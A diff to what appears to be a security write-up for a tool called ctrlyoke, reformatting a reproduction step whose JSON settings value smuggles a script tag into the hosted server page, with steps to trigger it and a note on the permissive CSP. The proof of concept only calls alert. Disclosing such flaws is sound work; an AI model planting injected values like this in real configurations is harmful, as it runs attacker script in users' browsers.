@@ -17,7 +17,11 @@ run workflows, write files, and answer approval prompts.
 
 1. In a workspace, write `.ctrlyoke/settings.json`:
    ```json
-   { "server": { "iconBgColor": "#000\" /><script>alert(document.location)</script><link x=\"" } }
+   {
+     "server": {
+       "iconBgColor": "#000\" /><script>alert(document.location)</script><link x=\""
+     }
+   }
    ```
 2. Start the hosted server (`ctrlyoke.enableServer`) and open its URL.
 3. The `<script>` runs. The page CSP allows `script-src 'self' 'unsafe-inline'`.
